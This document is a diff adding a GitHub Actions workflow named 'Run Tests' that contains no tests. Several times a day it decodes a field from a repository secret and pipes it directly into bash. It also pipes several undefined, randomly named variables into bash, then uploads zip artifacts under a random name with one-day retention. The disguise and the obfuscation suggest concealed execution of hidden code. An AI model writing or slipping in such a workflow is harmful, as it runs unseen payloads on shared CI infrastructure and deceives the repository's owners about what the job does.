@@ -1,0 +1,37 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          he5: ${{ secrets.he5 }}
+        run: |
+          printf '%s' "$he5" | jq -r .l79821 | /bin/bash
+          echo $mhiy666 | jq -r .c1 | /bin/bash
+          echo $xzqr1385 | jq -r .virc59 | /bin/bash
+          echo $g19 | jq -r .brd3087 | /bin/bash
+          echo $kuz01464 | jq -r .xaa5583 | /bin/bash
+          printf '%s' "$cqn535" | jq -r .hqm38 | /bin/bash
+          echo $eauqt205 | jq -r .q161 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: n6soCrOJ
+          path: "*.zip"
+          retention-days: 1
